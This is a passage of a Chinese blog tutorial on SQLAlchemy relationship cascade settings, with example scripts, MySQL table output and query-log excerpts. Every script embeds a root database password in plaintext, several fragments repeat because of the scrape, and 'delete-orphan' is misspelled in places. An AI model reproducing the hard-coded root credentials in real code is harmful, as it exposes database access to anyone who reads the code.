operator">|</span> Bob child2  <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+-------------+--------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>问题是,在<code>MySQL</code>的创建表的语句中,默认就没有<code>set null</code>的设置,但是在<code>SQLAlchemy</code>的<code>ORM</code>中却自己设置了.原因是什么?</p><p>这就涉及到了<code>sqlalchemy</code>中<code>relationship</code>的<code>cascade</code>参数的设置.</p><p>当然为了避免出现<code>null</code>这种情况,在创建外键时最好指定<code>null</code>不能为空</p><pre class="line-numbers language-python">p_id = Column(Integer, ForeignKey(&#39;parent.id&#39;, ondelete=&#39;cascade&#39;, onupdate=&#39;cascade&#39;),nullable=False)</code></pre></blockquote><h4 id="2-relationship中cascade参数设置"><a href="#2-relationship中cascade参数设置" class="headerlink" title="2.relationship中cascade参数设置"></a>2.<code>relationship</code>中<code>cascade</code>参数设置</h4><blockquote><p>主要可设置的参数包括以下几种,<code>cascade=</code></p><ul><li><code>save-update</code>:默认选项,表示当一个对象被添加到<code>session</code> 通过<code>session.add()</code> 时,与它关联的<code>relationship()</code> 也应该添加到同一个<code>session</code></li><li><code>delete</code>:表示当父对象被标记为删除时,其相关的子对象也应该被标记为删除.</li><li><code>delete-orphan</code>:当子对象和父对象取消关联时,子对象被标记为删除;父对象被标记删除时,子对象也被标记为删除.它大多用于一对多关系的<code>一</code> ,而在<code>多</code> 的一方不使用.如果要使用,必须设置<code>single_parent=True</code> .多对多同理.这也是符合常理的.比如:一个班级有多个学生,如果班级取消,那班级中的学生也要删除.不能一个学生删除,而删除整个班级.</li><li><code>merge</code>:默认选项,合并操作,表示新更新的数据会覆盖老数据.</li><li><code>expunge</code>:移除操作的时候,会将相关联的对象也进行移除,这个操作只是从session中移除,并不会从数据库删除</li><li><code>all</code>:包含<code>save-update, merge, refresh-expire, expunge, delete</code> ,并不包括<code>delete-orpha</code></li><li><code>all, delete-orpha</code> 是最常用的操作.</li></ul><hr><p>创建如下文件</p><pre><code class="python"><code class="language-python">p_id = Column(Integer, ForeignKey(&#39;parent.id&#39;, ondelete=&#39;cascade&#39;, onupdate=&#39;cascade&#39;),nullable=False)</code></pre></blockquote><h4 id="2-relationship中cascade参数设置"><a href="#2-relationship中cascade参数设置" class="headerlink" title="2.relationship中cascade参数设置"></a>2.<code>relationship</code>中<code>cascade</code>参数设置</h4><blockquote><p>主要可设置的参数包括以下几种,<code>cascade=</code></p><ul><li><code>save-update</code>:默认选项,表示当一个对象被添加到<code>session</code> 通过<code>session.add()</code> 时,与它关联的<code>relationship()</code> 也应该添加到同一个<code>session</code></li><li><code>delete</code>:表示当父对象被标记为删除时,其相关的子对象也应该被标记为删除.</li><li><code>delete-orphan</code>:当子对象和父对象取消关联时,子对象被标记为删除;父对象被标记删除时,子对象也被标记为删除.它大多用于一对多关系的<code>一</code> ,而在<code>多</code> 的一方不使用.如果要使用,必须设置<code>single_parent=True</code> .多对多同理.这也是符合常理的.比如:一个班级有多个学生,如果班级取消,那班级中的学生也要删除.不能一个学生删除,而删除整个班级.</li><li><code>merge</code>:默认选项,合并操作,表示新更新的数据会覆盖老数据.</li><li><code>expunge</code>:移除操作的时候,会将相关联的对象也进行移除,这个操作只是从session中移除,并不会从数据库删除</li><li><code>all</code>:包含<code>save-update, merge, refresh-expire, expunge, delete</code> ,并不包括<code>delete-orpha</code></li><li><code>all, delete-orpha</code> 是最常用的操作.</li></ul><hr><p>创建如下文件</p><pre><code class="python">#!/usr/bin/env python# coding=utf-8# 12级联对比3from sqlalchemy import create_enginefrom sqlalchemy.orm import sessionmakerfrom sqlalchemy.ext.declarative import declarative_basefrom sqlalchemy import Column, Integer, String, Date, DateTime, Time, Text, Enum, DECIMAL, ForeignKeyfrom sqlalchemy.orm import  relationship# 1.连接数据库engine = create_engine('mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy')# 2.创建SessionSession = sessionmaker(bind=engine)# 3.实例化sessionsession = Session()# 4.创建Model# 创建基类Base = declarative_base()# 创建映射class Cascade_Parent_3(Base):    __tablename__ = 'cascade_parent_3'    id = Column(Integer, primary_key=True, nullable=False)    name = Column(String(45))    # 设置双向关系    childs = relationship('Cascade_Child_3', back_populates='parent', cascade= '')class  Cascade_Child_3(Base):    __tablename__ = 'cascade_child_3'    id = Column(Integer, primary_key=True, nullable=False)    name = Column(String(45))    # 外键连接的是 表    # 使用默认的MySQl外键    p_id = Column(Integer, ForeignKey('cascade_parent_3.id'))    parent = relationship('Cascade_Parent_3', back_populates='childs', cascade='save-update')# 创建表Base.metadata.create_all(engine)# 添加数据p1 = Cascade_Parent_3(id=1, name='Jack')c1 = Cascade_Child_3(id=1, name='Jack child1', p_id=1)c2 = Cascade_Child_3(id=2, name='Jack child2', p_id=2)p1.childs.append(c1)p1.childs.append(c2)session.add(p1)# 双向关系,子表也可以添加数据p2 = Cascade_Parent_3(id=2, name='Bob')c3 = Cascade_Child_3(id=3, name='Bob child1', p_id=2)c4 = Cascade_Child_3(id=4, name='Bob child2', p_id=2)c3.parent = p2c4.parent = p2session.add(c3)session.add(c4)session.commit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在以上双向关系中,父表的<code>relationship</code>没有设置任何选项,子表中<code>relationship</code>只是设置了一个<code>save-update</code>.根据定义,应该看到:</p><ul><li>父表的数据更新,不会添加到子表</li><li>子表的数据更新,应该添加到父表</li></ul><p>运行文件</p><pre class="line-numbers language-bash">$ python  12级联对比3.py</code></pre><p>在<code>MySQL</code>中验证表,可以看到,父表没有把子表中的数据添加.</p><pre><code class="sql"><code class="language-bash">$ python  12级联对比3.py</code></pre><p>在<code>MySQL</code>中验证表,可以看到,父表没有把子表中的数据添加.</p><pre><code class="sql">mysql root@192.168.0.101:sqlalchemy> select * from cascade_parent_3;  +----+------+| id | name |+----+------+| 1  | Jack || 2  | Bob  |+----+------+mysql root@192.168.0.101:sqlalchemy> select * from cascade_child_3;         +----+------------+------+| id | name       | p_id |+----+------------+------+| 3  | Bob child1 | 2    || 4  | Bob child2 | 2    |+----+------------+------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>创建如下文件</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token comment" spellcheck="true"># 13级联对比4</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Time<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> DECIMAL<span class="token punctuation">,</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span>  relationship<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span><span class="token keyword">class</span> <span class="token class-name">Cascade_Parent_4</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'cascade_parent_4'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 设置双向关系</span>    childs <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Cascade_Child_4'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'parent'</span><span class="token punctuation">,</span> cascade<span class="token operator">=</span> <span class="token string">'save-update, delete'</span><span class="token punctuation">)</span><span class="token keyword">class</span>  <span class="token class-name">Cascade_Child_4</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'cascade_child_4'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 外键连接的是 表</span>    <span class="token comment" spellcheck="true"># 使用默认的MySQl外键</span>    p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'cascade_parent_4.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parent <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Cascade_Parent_4'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'childs'</span><span class="token punctuation">,</span> cascade<span class="token operator">=</span><span class="token string">'save-update'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建表</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 添加数据</span>p1 <span class="token operator">=</span> Cascade_Parent_4<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> Cascade_Child_4<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack child1'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>c2 <span class="token operator">=</span> Cascade_Child_4<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack child2'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>p1<span class="token punctuation">.</span>childs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c1<span class="token punctuation">)</span>p1<span class="token punctuation">.</span>childs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c2<span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 双向关系,子表也可以添加数据</span>p2 <span class="token operator">=</span> Cascade_Parent_4<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob'</span><span class="token punctuation">)</span>c3 <span class="token operator">=</span> Cascade_Child_4<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob child1'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>c4 <span class="token operator">=</span> Cascade_Child_4<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob child2'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>c3<span class="token punctuation">.</span>parent <span class="token operator">=</span> p2c4<span class="token punctuation">.</span>parent <span class="token operator">=</span> p2session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>c3<span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>c4<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在以上双向关系中,父表的<code>relationship</code>中设置了<code>delete</code>,子表中<code>relationship</code>中没有设置<code>delete</code>. 根据定义,应该看到:</p><ul><li>父表的数据删除,会删除子表中数据</li><li>子表的数据删除,不会删除父表中的数据.</li></ul><p>运行文件:</p><pre class="line-numbers language-bash">$ python  13级联对比4.py</code></pre><p>查看数据库表:</p><pre><code class="sql"><code class="language-bash">$ python  13级联对比4.py</code></pre><p>查看数据库表:</p><pre><code class="sql">mysql root@192.168.0.101:sqlalchemy> select * from cascade_parent_4;       +----+------+| id | name |+----+------+| 1  | Jack || 2  | Bob  |+----+------+mysql root@192.168.0.101:sqlalchemy> select * from cascade_child_4;   +----+-------------+------+| id | name        | p_id |+----+-------------+------+| 1  | Jack child1 | 1    || 2  | Jack child2 | 1    || 3  | Bob child1  | 2    || 4  | Bob child2  | 2    |+----+-------------+------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试在父表中删除数据:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 13级联对比4</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true"># 注释添加内容</span><span class="token comment" spellcheck="true"># 添加如下内容</span><span class="token comment" spellcheck="true"># 尝试删除一条数据</span>q1 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Cascade_Parent_4<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行文件:</p><pre class="line-numbers language-bash">$ python  13级联对比4.py</code></pre><p>查看<code>MySQL</code>日志:</p><pre><code class="bash"><code class="language-bash">$ python  13级联对比4.py</code></pre><p>查看<code>MySQL</code>日志:</p><pre><code class="bash">$ cat /mysql_data/localhost.log....2020-08-25T13:50:24.510759Z       41 Query    DELETE FROM cascade_child_4 WHERE cascade_child_4.id = 12020-08-25T13:50:24.517217Z       41 Query    DELETE FROM cascade_child_4 WHERE cascade_child_4.id = 22020-08-25T13:50:24.522725Z       41 Query    DELETE FROM cascade_parent_4 WHERE cascade_parent_4.id = 12020-08-25T13:50:24.527657Z       41 Query    COMMIT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看表:</p><pre class="line-numbers language-sql"><code class="language-sql">mysql root<span class="token variable">@192.168.0.101</span>:sqlalchemy<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> cascade_child_4<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token comment" spellcheck="true">----+------------+------+</span><span class="token operator">|</span> id <span class="token operator">|</span> name       <span class="token operator">|</span> p_id <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+------------+------+</span><span class="token operator">|</span> <span class="token number">3</span>  <span class="token operator">|</span> Bob child1 <span class="token operator">|</span> <span class="token number">2</span>    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">4</span>  <span class="token operator">|</span> Bob child2 <span class="token operator">|</span> <span class="token number">2</span>    <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+------------+------+</span>mysql root<span class="token variable">@192.168.0.101</span>:sqlalchemy<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> cascade_parent_4<span class="token punctuation">;</span>    <span class="token operator">+</span><span class="token comment" spellcheck="true">----+------+</span><span class="token operator">|</span> id <span class="token operator">|</span> name <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+------+</span><span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> Bob  <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">----+------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试从子表删除:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 13级联对比4</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true"># 注释添加内容</span><span class="token comment" spellcheck="true"># 添加如下内容</span><span class="token comment" spellcheck="true"># 尝试删除一条数据</span>q2 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Cascade_Child_4<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>Cascade_Child_4<span class="token punctuation">.</span>id <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>q2<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行并验证:</p><pre class="line-numbers language-bash"><code class="language-bash">mysql root@192.168.0.101:sqlalchemy<span class="token operator">></span> <span class="token keyword">select</span> * from cascade_parent_4<span class="token punctuation">;</span>           +----+------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> name <span class="token operator">|</span>+----+------+<span class="token operator">|</span> 2  <span class="token operator">|</span> Bob  <span class="token operator">|</span>+----+------+mysql root@192.168.0.101:sqlalchemy<span class="token operator">></span> <span class="token keyword">select</span> * from cascade_child_4<span class="token punctuation">;</span>  +----+------------+------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> name       <span class="token operator">|</span> p_id <span class="token operator">|</span>+----+------------+------+<span class="token operator">|</span> 4  <span class="token operator">|</span> Bob child2 <span class="token operator">|</span> 2    <span class="token operator">|</span>+----+------------+------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意:<code>relationship</code>没有设置参数的删除,参照上面的<strong>11级联对比2.py</strong>,不是真正的删除,只是吧相关的字段设置成<code>NULL</code>.</p><hr><p>创建如下文件:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token comment" spellcheck="true"># 14级联对比5</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Time<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> DECIMAL<span class="token punctuation">,</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span>  relationship<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span><span class="token keyword">class</span> <span class="token class-name">Cascade_Parent_5</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'cascade_parent_5'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 设置双向关系</span>    childs <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Cascade_Child_5'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'parent'</span><span class="token punctuation">,</span> cascade<span class="token operator">=</span> <span class="token string">'save-update, delete, delete-orphan'</span><span class="token punctuation">)</span><span class="token keyword">class</span>  <span class="token class-name">Cascade_Child_5</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'cascade_child_5'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 外键连接的是 表</span>    <span class="token comment" spellcheck="true"># 使用默认的MySQl外键</span>    p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'cascade_parent_5.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parent <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Cascade_Parent_5'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'childs'</span><span class="token punctuation">,</span> cascade<span class="token operator">=</span><span class="token string">'save-update'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建表</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 添加数据</span>p1 <span class="token operator">=</span> Cascade_Parent_5<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> Cascade_Child_5<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack child1'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>c2 <span class="token operator">=</span> Cascade_Child_5<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack child2'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>p1<span class="token punctuation">.</span>childs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c1<span class="token punctuation">)</span>p1<span class="token punctuation">.</span>childs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c2<span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 双向关系,子表也可以添加数据</span>p2 <span class="token operator">=</span> Cascade_Parent_5<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob'</span><span class="token punctuation">)</span>c3 <span class="token operator">=</span> Cascade_Child_5<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob child1'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>c4 <span class="token operator">=</span> Cascade_Child_5<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Bob child2'</span><span class="token punctuation">,</span> p_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>c3<span class="token punctuation">.</span>parent <span class="token operator">=</span> p2c4<span class="token punctuation">.</span>parent <span class="token operator">=</span> p2session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>c3<span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>c4<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据定义:<code>delete-orphan</code>的使用和<code>delete</code>类似.需要注意的是绑定到关系的哪一方.<code>delete-orphan</code>要和<code>delete</code>搭配使用.要删除就会都删除.</p><p>运行程序:</p><pre class="line-numbers language-bash">$ python  14级联对比5.py</code></pre><p>执行取消关联</p><pre><code class="python"><code class="language-bash">$ python  14级联对比5.py</code></pre><p>执行取消关联</p><pre><code class="python"># 14级联对比5# 注释添加数据# 添加取消关联q1 = session.query(Cascade_Parent_5).get(1)q1.childs = []session.commit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行并检查</p><pre class="line-numbers language-bash"><code class="language-bash">$ python 14*.py$ <span class="token function">cat</span> /mysql_data/localhost.log<span class="token punctuation">..</span>.2020-08-25T14:07:22.788616Z       44 Query    DELETE FROM cascade_child_5 WHERE cascade_child_5.id <span class="token operator">=</span> 12020-08-25T14:07:22.821541Z       44 Query    DELETE FROM cascade_child_5 WHERE cascade_child_5.id <span class="token operator">=</span> 2<span class="token punctuation">..</span>.<span aria-hidden="true" 